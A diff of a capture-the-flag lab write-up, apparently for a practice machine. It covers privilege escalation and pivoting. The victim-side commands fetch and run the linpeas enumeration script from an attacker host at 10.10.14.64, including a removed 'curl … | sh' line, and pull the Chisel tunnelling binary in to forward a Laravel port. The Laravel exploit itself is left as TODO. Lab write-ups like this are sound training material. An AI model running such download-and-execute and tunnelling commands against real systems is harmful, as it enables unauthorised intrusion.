@@ -180,4 +180,38 @@ Attacker (build then host linpeas script):
 
 Victim (dl and exec linpeas):
 
-    curl 10.10.14.64:8000/linpeas.sh | sh
+    wget 10.10.14.64:8000/linpeas.sh 
+    chmod +x linpeas.sh
+    ./linpeas.sh -h
+
+[See output here.](./LINPEAS_OUTPUT.txt)
+
+It's useless -- apparently we need to exploit Laravel.
+
+#### Laravel
+
+According to the writeup, I'm supposed to exploit Laravel, which is running on the victim, but the port isn't forwarded.
+
+So, the first step is to port forward using a tool called "Chisel".
+
+##### Port forward Laravel
+
+###### Get Chisel binary into victim
+
+On attacker:
+    pushd /tmp/
+    if [[ ! -f chisel_1.7.6_linux_386 ]]; then
+        wget "https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_386.gz"
+        gunzip chisel_1.7.6_linux_386.gz
+    fi
+    updog -d ./
+
+On victim:
+    wget 10.10.14.64:9090/chisel_1.7.6_linux_386
+    mv chisel_1.7.6_linux_386 chisel
+    chmod +x chisel
+    ls
+
+##### Laravel RCE -> Root flag
+
+TODO
